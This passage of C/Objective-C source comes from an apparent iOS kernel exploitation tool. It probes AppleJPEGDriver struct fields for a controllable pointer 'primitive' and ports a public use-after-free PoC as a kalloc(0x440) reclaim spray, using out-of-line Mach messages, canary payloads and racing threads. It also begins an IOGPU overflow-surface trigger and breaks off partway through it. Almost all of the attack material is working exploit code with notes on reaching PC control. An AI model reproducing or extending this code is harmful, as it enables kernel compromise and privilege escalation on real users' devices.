        for (int si = 0; si < 2; si++) {
            uint32_t slot = (si == 0) ? BASE : (BASE + 0x20);   // +0x58, +0x78
            uint64_t vals[40];
            int nv = 0;
            vals[nv++] = 0;
            for (uint64_t v = 1; v <= 0x10000000 && nv < 28; v <<= 1) vals[nv++] = v;
            vals[nv++] = (uint64_t)W * H;
            vals[nv++] = (uint64_t)W * H * 4;
            vals[nv++] = 0x0000000100000000ull;
            if (uaddr) { vals[nv++] = uaddr; vals[nv++] = uaddr + 0x800; }
            AveLog(S(@"[jpegmethods] value probe slot +%04x: %d candidates", slot, nv));
            for (int i = 0; i < nv; i++) {
                uint8_t *big = (uint8_t *)malloc(0x1000);
                uint8_t *bigo = (uint8_t *)malloc(0x1000);
                if (!big || !bigo) { free(big); free(bigo); break; }
                memset(big, 0, 0x1000);
                memset(bigo, 0, 0x1000);
                rs_jm_fill((RSJpegIn *)big, srcID, dstID, W, H, 0, 0x6161);
                memcpy(big + slot, &vals[i], 8);
                size_t os = 0x1000;
                kern_return_t kr = IOConnectCallStructMethod(conn, 5, big, 0x1000, bigo, &os);
                AveLog(S(@"[jpegmethods]   +%04x = %#018llx -> kr=%#x", slot, vals[i], kr));
                free(big);
                free(bigo);
                if (kr == KERN_SUCCESS && uaddr) {
                    // the field was accepted: did the driver touch our buffer?
                    int changed = 0;
                    for (uint32_t k = 0; k < 0x1000; k++)
                        if (ubuf[k] != 0x41) { changed = 1; break; }
                    if (changed) {
                        AveLog(S(@"[jpegmethods]   *** DRIVER WROTE INTO OUR USER BUFFER (+%04x = %#llx) ***",
                                 slot, vals[i]));
                        rs_jm_dump(@"userbuf", ubuf, 0x1000);
                    }
                }
            }
        }
        free(ubuf);
    }

    // ---- sel5 POINTER PROBE: the value probe proved +0x58 is a 32-bit field
    //      (every value below 2^32 works; 0x100000000 and the user address are
    //      rejected) while +0x78 accepts ARBITRARY 64-bit values including a
    //      user address, with kr=0.  A field that takes a full 64-bit user
    //      address is a pointer candidate.  Test it properly this time: point
    //      it at our pattern buffer, let the async completion LAND (drain the
    //      notification) and only then check whether the driver touched the
    //      buffer - and try unmapped addresses to see whether it dereferences
    //      the pointer at all.  A panic on an unmapped value would name the
    //      field as a pointer outright. ----
    {
        const uint32_t SLOT = 8, BASE = (uint32_t)sizeof(RSJpegIn);
        uint8_t *ubuf = (uint8_t *)malloc(0x1000);
        uint64_t cands[8];
        int nc = 0;
        uint64_t uaddr = ubuf ? (uint64_t)(uintptr_t)ubuf : 0;
        if (uaddr) { cands[nc++] = uaddr; cands[nc++] = uaddr + 0x800; }
        cands[nc++] = 0x0000414141414141ull;   // clearly unmapped
        cands[nc++] = 0x0000000deadbeefull;
        cands[nc++] = 0xffffffffffffffffull;
        AveLog(S(@"[jpegmethods] pointer probe on +0x78, %d candidates (buffer %#llx)", nc, uaddr));
        for (int i = 0; i < nc; i++) {
            uint8_t *big = (uint8_t *)malloc(0x1000);
            uint8_t *bigo = (uint8_t *)malloc(0x1000);
            if (!big || !bigo) { free(big); free(bigo); break; }
            memset(big, 0, 0x1000);
            memset(bigo, 0, 0x1000);
            if (ubuf) memset(ubuf, 0x41, 0x1000);      // fresh pattern each round
            rs_jm_fill((RSJpegIn *)big, srcID, dstID, W, H, 0, 0x6161);
            memcpy(big + BASE + 0x20, &cands[i], SLOT);   // +0x78 = candidate
            size_t os = 0x1000;
            kern_return_t kr = IOConnectCallStructMethod(conn, 5, big, 0x1000, bigo, &os);
            AveLog(S(@"[jpegmethods] ptr +0x78 = %#018llx -> kr=%#x", cands[i], kr));
            rs_jm_drain(notify, S(@"ptr %#llx", cands[i]));  // let the completion land
            if (ubuf && kr == KERN_SUCCESS) {
                int changed = 0;
                for (uint32_t k = 0; k < 0x1000; k++)
                    if (ubuf[k] != 0x41) { changed = 1; break; }
                if (changed) {
                    AveLog(S(@"[jpegmethods] *** DRIVER WROTE INTO OUR USER BUFFER (ptr +0x78 = %#llx) ***",
                             cands[i]));
                    rs_jm_dump(@"userbuf", ubuf, 0x1000);
                }
            }
            free(big);
            free(bigo);
        }
        free(ubuf);
    }

    // ---- sel5 THRESHOLD PROBE: +0x78 accepts our user address and 0xdeadbeef
    //      but rejects 0x414141414141 and 0xffffffffffffffff, so the field IS
    //      range-checked.  Binary-search the exact boundary: a boundary at a
    //      user-address-space limit means +0x78 is a POINTER (validated like an
    //      IOKit user pointer); a boundary at a round byte size means it is a
    //      LENGTH.  Either answer decides the next move. ----
    {
        const uint32_t BASE = (uint32_t)sizeof(RSJpegIn);
        uint64_t lo = 0, hi = 0;
        AveLog(@"[jpegmethods] threshold probe on +0x78 (pointer range or size limit?)");
        for (int shift = 32; shift <= 47; shift++) {
            uint64_t v = 1ull << shift;
            kern_return_t kr = rs_jm_tryVal(conn, BASE + 0x20, v, srcID, dstID, W, H);
            AveLog(S(@"[jpegmethods]   +0x78 = 2^%d = %#018llx -> kr=%#x", shift, v, kr));
            if (kr == KERN_SUCCESS) lo = v;
            else { hi = v; break; }
        }
        if (lo && hi) {
            for (int i = 0; i < 8 && hi - lo > 1; i++) {
                uint64_t mid = lo + (hi - lo) / 2;
                kern_return_t kr = rs_jm_tryVal(conn, BASE + 0x20, mid, srcID, dstID, W, H);
                AveLog(S(@"[jpegmethods]   +0x78 = %#018llx -> kr=%#x %@", mid, kr,
                         kr == KERN_SUCCESS ? @"(accepted)" : @"(rejected)"));
                if (kr == KERN_SUCCESS) lo = mid; else hi = mid;
            }
            AveLog(S(@"[jpegmethods] +0x78 BOUNDARY: accepted <= %#llx, rejected from %#llx", lo, hi));
            AveLog(S(@"[jpegmethods] +0x78 boundary is 2^%d (accepted) / 2^%d (rejected)",
                     __builtin_clzll(lo) ? (63 - __builtin_clzll(lo)) : 0,
                     __builtin_clzll(hi) ? (63 - __builtin_clzll(hi)) : 0));
        } else {
            AveLog(S(@"[jpegmethods] threshold probe: no boundary found (lo=%#llx hi=%#llx)", lo, hi));
        }
    }

    // ---- sel5 DEREF TEST: +0x78 is range-checked to <= 2^44 and our user
    //      address passes, so it is a pointer candidate.  A pointer only
    //      matters if the driver DEREFERENCES it.  Point +0x78 at a buffer
    //      whose first 8 bytes we vary (0, 1, 0x10, 0x1000, 0x100000, all-ones)
    //      while +0x58 (the 32-bit field) is set to a matching length.  If kr
    //      changes with the POINTED-TO content, the driver reads through the
    //      pointer - and we control what it reads, which is the primitive. ----
    {
        const uint32_t BASE = (uint32_t)sizeof(RSJpegIn);
        uint8_t *pb = (uint8_t *)malloc(0x1000);
        if (!pb) {
            AveLog(@"[jpegmethods] deref test: pattern buffer allocation failed");
        } else {
            uint64_t paddr = (uint64_t)(uintptr_t)pb;
            uint64_t contents[6] = {0, 1, 0x10, 0x1000, 0x100000, 0xffffffffffffffffull};
            uint32_t lens[4] = {0, 0x58, 0x1000, 0x100000};
            AveLog(S(@"[jpegmethods] deref test: +0x78 -> %#llx, vary the pointed-to content", paddr));
            for (int li = 0; li < 4; li++) {
                for (int ci = 0; ci < 6; ci++) {
                    memset(pb, 0x42, 0x1000);
                    memcpy(pb, &contents[ci], 8);
                    uint8_t *big = (uint8_t *)malloc(0x1000);
                    uint8_t *bigo = (uint8_t *)malloc(0x1000);
                    if (!big || !bigo) { free(big); free(bigo); break; }
                    memset(big, 0, 0x1000);
                    memset(bigo, 0, 0x1000);
                    rs_jm_fill((RSJpegIn *)big, srcID, dstID, W, H, 0, 0x6161);
                    memcpy(big + BASE, &lens[li], 4);            // +0x58 = 32-bit length
                    memcpy(big + BASE + 0x20, &paddr, 8);         // +0x78 = our buffer
                    size_t os = 0x1000;
                    kern_return_t kr = IOConnectCallStructMethod(conn, 5, big, 0x1000, bigo, &os);
                    AveLog(S(@"[jpegmethods]   +0x58=%#x ptr->%#llx -> kr=%#x",
                             lens[li], contents[ci], kr));
                    // THE MISSED CHECK: the 4096-byte OUTPUT was never dumped in
                    // this test.  Dispatcher C does `lsl w22, w22, #2` on a value
                    // and then INDEXED STORES (str wN, [x9, w13, uxtw]) - so our
                    // input can plausibly land in the output.  Any echo of our
                    // canary there is a controlled read-back channel through the
                    // driver, i.e. a kernel-buffer write we control.
                    if (kr == KERN_SUCCESS) {
                        int echoed = 0;
                        for (uint32_t k = 0; k < 0x1000; k++)
                            if (bigo[k] != 0) { echoed = 1; break; }
                        if (echoed) {
                            AveLog(S(@"[jpegmethods]   *** SEL5 OUTPUT IS NON-ZERO (len=%#x ptr->%#llx) ***",
                                     lens[li], contents[ci]));
                            rs_jm_dump(@"sel5 out", bigo, 0x1000);
                        }
                    }
                    if (kr == KERN_SUCCESS) {
                        int changed = 0;
                        for (uint32_t k = 0; k < 0x1000; k++)
                            if (pb[k] != 0x42) { changed = 1; break; }
                        if (changed) {
                            AveLog(S(@"[jpegmethods]   *** DRIVER WROTE THROUGH +0x78 (len=%#x) ***",
                                     lens[li]));
                            rs_jm_dump(@"ptrbuf", pb, 0x1000);
                        }
                    }
                    free(big);
                    free(bigo);
                }
            }
        }
        free(pb);
    }

    IOServiceClose(conn);
    CFRelease(src); CFRelease(dst); CFRelease(encSrc); CFRelease(encDst);
    IOObjectRelease(svc);
    AveSetStatus(@"selector audit done - see the log");
    return @"selector audit done: any sel with kr=0 and a full outSize is a REACHABLE handler (reverse its struct next); 0xe00002c2 = bad argument, 0xe00002bc = unsupported/refused, 0xe00002c1 = not privileged";
}

// ===========================================================================
// 4d. CVE-2026-20687 - kalloc(0x440) OOL RECLAIM SPRAY
//     Source: github.com/0xjohnnydev/CVE-2026-20687-AppleJPEGDriver-UAF
//     ios-app/Test/ViewController.m - uafCharacterize / sprayOOL.
//     What the PoC actually says (and what our earlier modules never did):
//       * the freed object is JpegRequest, 0x440 = 1088 bytes, so its zone is
//         kalloc(0x440) - NOT kalloc.80 (that was the 20637 mistake);
//       * the UAF read chain is req+128 (self-ptr) -> req+784 (flags), and PC
//         control is *(*(req+0)+40)() in finish_io_gated;
//       * the reclaim primitive is an OUT-OF-LINE mach message of exactly
//         0x440 bytes sent to a port we own: the kernel copies our bytes into
//         a kalloc(0x440) allocation and keeps it queued on the port, so the
//         freed JpegRequest slot can be occupied by OUR data;
//       * the PoC zeroes +128 and +784 so a successful reclaim does not fault;
//       * ORACLE: "If no panic -> reclaim succeeded (controlled UAF)";
//                  "If panic -> FEEDFACE in freed slot (uncontrolled UAF)".
//     The bug mechanism (their singleLeakTest notes): every async request makes
//     queue_io_gated call taggedRetain on the userclient; IOServiceClose sets
//     isInactive EARLY (terminatePhase1, before the command gate); in-flight HW
//     jobs then hit finish_io_gated, see isInactive and SKIP taggedRelease -
//     a leaked retain per in-flight job, and the request is freed with its
//     queue node still linked.
//     This module replays their uafCharacterize on OUR A14 / 26.2b1:
//       Phase 0: health oracle (selector 2 == KERN_SUCCESS);
//       Phase 1: 100 sequential victim -> reclaim cycles;
//       Phase 2: 3 concurrent threads (victim, reclaimer, OOL sprayer);
//       Phase 3: the same, but the spray carries our 0xC0FFEE5A canary at
//                every offset except the two UAF-critical ones - so if the
//                kernel DOES fault on our data, the panic dump proves the
//                freed slot was occupied by us (controlled content);
//       plus the wired-memory delta (the taggedRetain leak).
// ===========================================================================
static BOOL rs_jr_healthy(io_service_t svc) {
    io_connect_t conn = 0;
    if (IOServiceOpen(svc, mach_task_self(), 0, &conn) != KERN_SUCCESS || !conn) return NO;
    kern_return_t kr = IOConnectCallMethod(conn, 2, NULL, 0, NULL, 0,
                                           NULL, NULL, NULL, NULL);
    IOServiceClose(conn);
    return (kr == KERN_SUCCESS);
}

// count OOL messages of exactly 0x440 bytes to the port pool.
// safeMode == 1 : the PoC layout - 'J' filler, +128 (self-ptr) and +784
//                 (flags) zeroed, so a landed reclaim does not fault.
// safeMode == 0 : our canary at every other offset, same two zeroes - a panic
//                 on our data then proves controlled content.
// A receive port's queue defaults to MACH_PORT_QLIMIT_DEFAULT = 5 messages, so
// a single port caps the spray at 5 sends (measured: spray=5, then spray=0).
// mach_port_set_qlimit is not exported by the SDK umbrella on this toolchain
// (link error), so instead of raising the limit we use a POOL of ports and
// round-robin: N ports hold N*5 live 0x440 allocations.
#define RS_JR_PORTS 256
static mach_port_t rs_jr_ports[RS_JR_PORTS];
static int rs_jr_nports = 0;

static int rs_jr_setupSprayPorts(void) {
    rs_jr_nports = 0;
    for (int i = 0; i < RS_JR_PORTS; i++) {
        mach_port_t p = MACH_PORT_NULL;
        if (mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &p) != KERN_SUCCESS) break;
        mach_port_insert_right(mach_task_self(), p, p, MACH_MSG_TYPE_MAKE_SEND);
        rs_jr_ports[i] = p;
        rs_jr_nports++;
    }
    return rs_jr_nports;
}

static void rs_jr_freeSprayPorts(void) {
    for (int i = 0; i < rs_jr_nports; i++) {
        if (rs_jr_ports[i] != MACH_PORT_NULL) {
            mach_port_destroy(mach_task_self(), rs_jr_ports[i]);
            rs_jr_ports[i] = MACH_PORT_NULL;
        }
    }
    rs_jr_nports = 0;
}

// One send attempt in a given shape; returns the raw kr so the caller can log
// exactly which shape this kernel accepts.  The device run proved that the
// PoC's shape (OOL + MACH_MSGH_BITS(MAKE_SEND,0) + a zero timeout) fails with
// MACH_SEND_TIMED_OUT on the VERY FIRST send, i.e. before any queue limit is
// relevant - so the shape itself, not the port pool, is the problem.
//   variant 0: OOL, MAKE_SEND   (the PoC's exact call)
//   variant 1: OOL, COPY_SEND
//   variant 2: OOL, MOVE_SEND_ONCE
//   variant 3: one INLINE message of exactly `size` bytes (no descriptors)
static kern_return_t rs_jr_sendShape(mach_port_t port, uint8_t *payload,
                                     uint32_t size, int variant, int blocking) {
    mach_msg_option_t opt = blocking ? MACH_SEND_MSG
                                     : (mach_msg_option_t)(MACH_SEND_MSG | MACH_SEND_TIMEOUT);
    if (variant < 3) {
        struct {
            mach_msg_header_t          header;
            mach_msg_body_t            body;
            mach_msg_ool_descriptor_t  ool;
        } msg;
        memset(&msg, 0, sizeof msg);
        mach_msg_type_name_t disp = MACH_MSG_TYPE_MAKE_SEND;
        if (variant == 1) disp = MACH_MSG_TYPE_COPY_SEND;
        if (variant == 2) disp = MACH_MSG_TYPE_MOVE_SEND_ONCE;
        msg.header.msgh_bits = MACH_MSGH_BITS(disp, 0) | MACH_MSGH_BITS_COMPLEX;
        msg.header.msgh_size = sizeof(msg);
        msg.header.msgh_remote_port = port;
        msg.body.msgh_descriptor_count = 1;
        msg.ool.address = payload;
        msg.ool.size = size;
        msg.ool.deallocate = FALSE;
        msg.ool.copy = MACH_MSG_PHYSICAL_COPY;
        msg.ool.type = MACH_MSG_OOL_DESCRIPTOR;
        return mach_msg(&msg.header, opt, sizeof(msg), 0,
                        MACH_PORT_NULL, 0, MACH_PORT_NULL);
    }
    uint8_t *buf = (uint8_t *)malloc(size);
    if (!buf) return (kern_return_t)0x10000002;
    memset(buf, 0, size);
    mach_msg_header_t *h = (mach_msg_header_t *)buf;
    h->msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
    h->msgh_size = size;
    h->msgh_remote_port = port;
    memcpy(buf + sizeof(mach_msg_header_t),
           payload + sizeof(mach_msg_header_t),
           size - sizeof(mach_msg_header_t));
    kern_return_t kr = mach_msg(h, opt, size, 0, MACH_PORT_NULL, 0, MACH_PORT_NULL);
    free(buf);
    return kr;
}

// Probe every shape once on fresh ports and log the kr.  Returns the first
// variant the kernel accepts, or -1 if none work.
static int rs_jr_probeShapes(uint8_t *payload, uint32_t size) {
    int best = -1;
    for (int v = 0; v < 4; v++) {
        mach_port_t p = MACH_PORT_NULL;
        if (mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &p) != KERN_SUCCESS) {
            AveLog(S(@"[jpeg440]   shape%d: probe port alloc FAILED", v));
            continue;
        }
        mach_port_insert_right(mach_task_self(), p, p, MACH_MSG_TYPE_MAKE_SEND);
        kern_return_t kr = rs_jr_sendShape(p, payload, size, v, 1);
        const char *nm = (v == 0) ? "OOL MAKE_SEND" : (v == 1) ? "OOL COPY_SEND"
                        : (v == 2) ? "OOL MOVE_SEND_ONCE" : "inline 0x440 COPY_SEND";
        AveLog(S(@"[jpeg440]   shape%d %s: kr=%#x %@", v, nm, kr,
                 kr == KERN_SUCCESS ? @"<== WORKS" : @""));
        if (kr == KERN_SUCCESS && best < 0) best = v;
        mach_port_destroy(mach_task_self(), p);
    }
    return best;
}

// Non-blocking send in the working shape; when a port's queue is full, receive
// (and discard) one message from it to free a slot and retry once.  That also
// keeps kalloc(0x440) churning, which is what a race reclaim needs.
static int rs_jr_sprayOOL(int count, int safeMode) {
    if (rs_jr_nports <= 0) return 0;
    const uint32_t size = 0x440;
    uint8_t *payload = (uint8_t *)malloc(size);
    if (!payload) return 0;
    if (safeMode) {
        memset(payload, 'J', size);
    } else {
        for (uint32_t k = 0; k + 8 <= size; k += 8) {
            uint64_t v = 0xC0FFEE5A00000000ull | (uint64_t)k;
            memcpy(payload + k, &v, 8);
        }
    }
    memset(payload + 128, 0, 8);   // request+128 self-ptr = NULL -> no deref
    payload[784] = 0;              // request+784 flags   = 0    -> no fault

    static int shape = -2;          // -2 = not probed yet
    if (shape == -2) {
        shape = rs_jr_probeShapes(payload, size);
        AveLog(S(@"[jpeg440] working send shape: %d", shape));
    }
    if (shape < 0) { free(payload); return 0; }

    int sent = 0, drained = 0;
    kern_return_t firstFail = 0;
    for (int i = 0; i < count; i++) {
        mach_port_t port = rs_jr_ports[i % rs_jr_nports];
        kern_return_t kr = rs_jr_sendShape(port, payload, size, shape, 0);
        if (kr == (kern_return_t)0x10000004) {          // MACH_SEND_TIMED_OUT
            uint8_t buf[0x600];
            mach_msg_header_t *rh = (mach_msg_header_t *)buf;
            if (mach_msg(rh, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0, sizeof(buf),
                         port, 0, MACH_PORT_NULL) == MACH_MSG_SUCCESS) drained++;
            kr = rs_jr_sendShape(port, payload, size, shape, 0);
        }
        if (kr != KERN_SUCCESS) { if (!firstFail) firstFail = kr; break; }
        sent++;
    }
    if (firstFail || sent < count)
        AveLog(S(@"[jpeg440]   spray sent=%d drained=%d firstFail=%#x shape=%d ports=%d",
                 sent, drained, firstFail, shape, rs_jr_nports));
    free(payload);
    return sent;
}

NSString *ModJpegReclaim(void) {
    AveLog(@"[jpeg440] === CVE-2026-20687: kalloc(0x440) OOL reclaim spray (PoC uafCharacterize port) ===");
    io_service_t svc = rs_jpeg_service();
    if (!svc) return @"AppleJPEGDriver: service not found";

    BOOL healthy = rs_jr_healthy(svc);
    AveLog(S(@"[jpeg440] driver health (sel2): %@", healthy ? @"OK" : @"BROKEN"));
    if (!healthy) {
        IOObjectRelease(svc);
        AveSetStatus(@"driver broken - reboot first");
        return @"driver BROKEN (sel2 != 0): the previous run left it wedged - REBOOT the device first, then re-run this module";
    }

    const uint32_t W = 2048, H = 2048;
    UIGraphicsBeginImageContext(CGSizeMake(W, H));
    [[UIColor redColor] setFill];
    UIRectFill(CGRectMake(0, 0, W, H));
    UIImage *img = UIGraphicsGetImageFromCurrentImageContext();
    UIGraphicsEndImageContext();
    NSData *jpeg = UIImageJPEGRepresentation(img, 0.9);
    if (!jpeg) { IOObjectRelease(svc); return @"jpeg encode failed"; }

    size_t allocLen = (jpeg.length + 0x3FFF) & ~(size_t)0x3FFF;
    NSDictionary *sp = @{(id)kIOSurfaceWidth: @(allocLen), (id)kIOSurfaceHeight: @1,
                         (id)kIOSurfaceBytesPerElement: @1, (id)kIOSurfacePixelFormat: @0x20202020};
    IOSurfaceRef_ src = IOSurfaceCreate((__bridge CFDictionaryRef)sp);
    NSDictionary *dp = @{(id)kIOSurfaceWidth: @(W), (id)kIOSurfaceHeight: @(H),
                         (id)kIOSurfaceBytesPerElement: @4, (id)kIOSurfacePixelFormat: @0x42475241};
    IOSurfaceRef_ dst = IOSurfaceCreate((__bridge CFDictionaryRef)dp);
    if (!src || !dst) {
        if (src) CFRelease(src);
        if (dst) CFRelease(dst);
        IOObjectRelease(svc);
        return @"surface creation failed";
    }
    IOSurfaceLock(src, 0, NULL);
    memcpy(IOSurfaceGetBaseAddress(src), jpeg.bytes, jpeg.length);
    IOSurfaceUnlock(src, 0, NULL);
    uint32_t srcID = IOSurfaceGetID(src), dstID = IOSurfaceGetID(dst);

    // the OOL spray port: messages accumulate, each holding a kalloc(0x440)
    // the OOL spray port POOL: messages accumulate on these ports, each message
    // holding one live kalloc(0x440) allocation with our bytes in it
    int nports = rs_jr_setupSprayPorts();
    AveLog(S(@"[jpeg440] spray ports: %d (x5 queue limit = %d live 0x440 allocations)",
             nports, nports * 5));
    if (nports <= 0) AveLog(@"[jpeg440] WARNING: no spray ports - the reclaim cannot spray");

    int64_t wired0 = rs_wired_pages();
    AveLog(S(@"[jpeg440] wired before: %lld pages", wired0));

    int victimTotal = 0, reclaimTotal = 0, sprayTotal = 0;
    int healthOK = 0, healthTotal = 0;

    // ---- Phase 1: 100 sequential victim -> reclaim cycles ----
    const int CYCLES = 100, V_REQS = 5, R_CONNS = 3, R_REQS = 3;
    AveLog(S(@"[jpeg440] phase 1: %d sequential victim->reclaim cycles", CYCLES));
    for (int c = 0; c < CYCLES; c++) {
        io_connect_t victim = 0;
        if (IOServiceOpen(svc, mach_task_self(), 0, &victim) == KERN_SUCCESS && victim) {
            victimTotal += rs_jc_submit(victim, srcID, dstID, W, H, V_REQS, 0x4141, 1, 0, 0);
            IOServiceClose(victim);                    // close with jobs in flight
        }
        for (int r = 0; r < R_CONNS; r++) {
            io_connect_t rc = 0;
            if (IOServiceOpen(svc, mach_task_self(), 0, &rc) != KERN_SUCCESS || !rc) continue;
            reclaimTotal += rs_jc_submit(rc, srcID, dstID, W, H, R_REQS, 0xBEEF, 1, 0, 0);
            IOServiceClose(rc);
        }
        if ((c + 1) % 25 == 0) {
            usleep(200000);
            healthTotal++;
            if (rs_jr_healthy(svc)) healthOK++;
            int64_t d = rs_wired_pages() - wired0;
            AveLog(S(@"[jpeg440]   [%d] wired=%+lld victim=%d reclaim=%d", c + 1, d, victimTotal, reclaimTotal));
            if (!rs_jr_healthy(svc)) { AveLog(@"[jpeg440] driver broke - stopping"); break; }
        }
    }

    // ---- Phase 2: concurrent racing with the SAFE OOL spray ----
    AveLog(@"[jpeg440] phase 2: 3 concurrent threads x 50 iters, SAFE spray ('J', +128/+784 zeroed)");
    {
        const int RACE_ITERS = 50;
        __block int32_t raceV = 0, raceR = 0, raceS = 0;
        dispatch_group_t group = dispatch_group_create();
        dispatch_group_async(group, dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
            for (int i = 0; i < RACE_ITERS; i++) {
                io_connect_t c = 0;
                if (IOServiceOpen(svc, mach_task_self(), 0, &c) != KERN_SUCCESS || !c) continue;
                __sync_fetch_and_add(&raceV, rs_jc_submit(c, srcID, dstID, W, H, 5, 0xDEAD, 1, 0, 0));
                IOServiceClose(c);
            }
        });
        dispatch_group_async(group, dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
            for (int i = 0; i < RACE_ITERS; i++) {
                io_connect_t c = 0;
                if (IOServiceOpen(svc, mach_task_self(), 0, &c) != KERN_SUCCESS || !c) continue;
                __sync_fetch_and_add(&raceR, rs_jc_submit(c, srcID, dstID, W, H, 5, 0xCAFE, 1, 0, 0));
                IOServiceClose(c);
            }
        });
        dispatch_group_async(group, dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
            for (int i = 0; i < RACE_ITERS * 20; i++)
                __sync_fetch_and_add(&raceS, rs_jr_sprayOOL(1, 1));
        });
        dispatch_group_wait(group, dispatch_time(DISPATCH_TIME_NOW, 30 * NSEC_PER_SEC));
        victimTotal += raceV; reclaimTotal += raceR; sprayTotal += raceS;
        AveLog(S(@"[jpeg440] phase 2 done: victim=%d reclaim=%d spray=%d", raceV, raceR, raceS));
    }

    // ---- Phase 3: the same, but the spray carries OUR CANARY ----
    AveLog(@"[jpeg440] phase 3: 3 concurrent threads x 50 iters, CANARY spray (0xC0FFEE5A at every offset but +128/+784)");
    {
        const int RACE_ITERS = 50;
        __block int32_t raceV = 0, raceR = 0, raceS = 0;
        dispatch_group_t group = dispatch_group_create();
        dispatch_group_async(group, dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
            for (int i = 0; i < RACE_ITERS; i++) {
                io_connect_t c = 0;
                if (IOServiceOpen(svc, mach_task_self(), 0, &c) != KERN_SUCCESS || !c) continue;
                __sync_fetch_and_add(&raceV, rs_jc_submit(c, srcID, dstID, W, H, 5, 0xDEAD, 1, 0, 0));
                IOServiceClose(c);
            }
        });
        dispatch_group_async(group, dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
            for (int i = 0; i < RACE_ITERS; i++) {
                io_connect_t c = 0;
                if (IOServiceOpen(svc, mach_task_self(), 0, &c) != KERN_SUCCESS || !c) continue;
                __sync_fetch_and_add(&raceR, rs_jc_submit(c, srcID, dstID, W, H, 5, 0xCAFE, 1, 0, 0));
                IOServiceClose(c);
            }
        });
        dispatch_group_async(group, dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
            for (int i = 0; i < RACE_ITERS * 20; i++)
                __sync_fetch_and_add(&raceS, rs_jr_sprayOOL(1, 0));
        });
        dispatch_group_wait(group, dispatch_time(DISPATCH_TIME_NOW, 30 * NSEC_PER_SEC));
        victimTotal += raceV; reclaimTotal += raceR; sprayTotal += raceS;
        AveLog(S(@"[jpeg440] phase 3 done: victim=%d reclaim=%d spray=%d", raceV, raceR, raceS));
    }

    // release the spray (frees every queued kalloc(0x440) at once)
    rs_jr_freeSprayPorts();
    usleep(500000);

    int64_t wired1 = rs_wired_pages();
    BOOL finalHealth = rs_jr_healthy(svc);
    AveLog(S(@"[jpeg440] wired delta: %+lld pages (the taggedRetain leak)", wired1 - wired0));
    AveLog(S(@"[jpeg440] health %d/%d, final: %@", healthOK, healthTotal, finalHealth ? @"OK" : @"BROKEN"));

    CFRelease(src); CFRelease(dst); IOObjectRelease(svc);
    AveSetStatus(@"kalloc440 reclaim done - see the log");
    if (!finalHealth)
        return S(@"kalloc440: spray=%d victim=%d reclaim=%d wired %+lld; driver BROKEN at the end (DoSing, not control)", sprayTotal, victimTotal, reclaimTotal, wired1 - wired0);
    return S(@"kalloc440: spray=%d victim=%d reclaim=%d wired %+lld; driver OK and NO PANIC = per the PoC oracle the freed slot was reclaimed by OUR data", sprayTotal, victimTotal, reclaimTotal, wired1 - wired0);
}

// ===========================================================================
// 1. CVE-2026-64788 oracle
// ===========================================================================
NSString *ModIOGPUUAFOracle(void) {
    id dev = nil;      // declared at function scope (mid-block decls trip the CI parser)
    id tex = nil;
    id td = nil;
    AveLog(@"[gpu64788] === CVE-2026-64788 oracle: overflow IOSurface -> stale GPU resource entry ===");

    // ---- (1) find an accelerator / GPU user client ----
    const char *cls[] = { "AGXAcceleratorG13P", "AGXAcceleratorG17P",
                          "IOGPUDevice", "IOGPUFamily", NULL };
    io_connect_t gpu = 0;
    const char *who = NULL;
    for (int i = 0; cls[i]; i++) {
        CFMutableDictionaryRef m = IOServiceMatching(cls[i]);
        if (!m) continue;
        io_service_t d = IOServiceGetMatchingService(kIOMainPortDefault, m);
        if (!d) continue;
        io_connect_t c = 0;
        kern_return_t kr = IOServiceOpen(d, mach_task_self(), 0, &c);
        IOObjectRelease(d);
        AveLog(S(@"    class %-18s -> open %#x", cls[i], kr));
        if (kr == KERN_SUCCESS && c) {
            if (gpu) IOServiceClose(gpu);
            gpu = c; who = cls[i];
        }
    }
    if (!gpu) {
        AveLog(@"[gpu64788] no accelerator user client openable - the Metal path may still reach it via the GPU daemon");
    } else {
        AveLog(S(@"[gpu64788] accelerator client: %s", who));
    }

    // ---- (2) drive the overflow path: 1x65535 packed dimensions ----
    int made = 0;
    struct { uint32_t w, h; const char *tag; } O[] = {
        {1, 65535, "1x65535 (packed overflow)"},
        {65535, 1, "65535x1"},
        {1, 65536, "1x65536"},
        {8192, 8192, "8192x8192 (control)"},
    };
    for (unsigned i = 0; i < sizeof(O)/sizeof(O[0]); i++) {
        @autoreleasepool {
            NSDictionary *d = @{(id)kIOSurfaceWidth: @(O[i].w),
                                (id)kIOSurfaceHeight: @(O[i].h),
                                (id)kIOSurfaceBytesPerElement: @(4)};
            IOSurfaceRef_ s = IOSurfaceCreate((__bridge CFDictionaryRef)d);
            if (!s) { AveLog(S(@"    surface %-24s -> create FAILED", O[i].tag)); continue; }
            uint32_t id = IOSurfaceGetID(s);
            AveLog(S(@"    surface %-24s -> id=%u alloc=%zu", O[i].tag, id, IOSurfaceGetAllocSize(s)));
            made++;
            // The trigger: a Metal texture over the overflow surface is how the
            // public PoC reaches IOGPUDevice::create_resource_iosurface.
            @try {
                dev = MTLCreateSystemDefaultDevice();
                if (dev) {
                    Class tdCls = objc_getClass("MTLTextureDescriptor");
                    td = [tdCls texture2DDescriptorWithPixelFormat:RS_MTL_PIXEL_BGRA8UNORM
                                                             width:O[i].w height:O[i].h mipmapped:NO];
                    [td setUsage:RS_MTL_USAGE_SHADERREAD];
                    tex = [dev newTextureWithDescriptor:td
                                              iosurface:(struct __IOSurface *)s
                                                  plane:0];
                    AveLog(S(@"    texture %-24s -> %s", O[i].tag, tex ? "created" : "nil"));
                } else {
                    AveLog(S(@"    texture %-24s -> no MTLDevice", O[i].tag));
                }
            } @catch (NSException *e) {
                AveLog(S(@"    texture %-24s -> threw %@", O[i].tag, e.reason));
            }
            CFRelease(s);
        }
    }
    AveLog(S(@"[gpu64788] %d/4 overflow surfaces created", made));

    // ---- (2b) AFTER the textures exist, retry the GPU classes with every
    // connection type (the GPU daemon sets up the accelerators on first use) ----
    if (!gpu) {
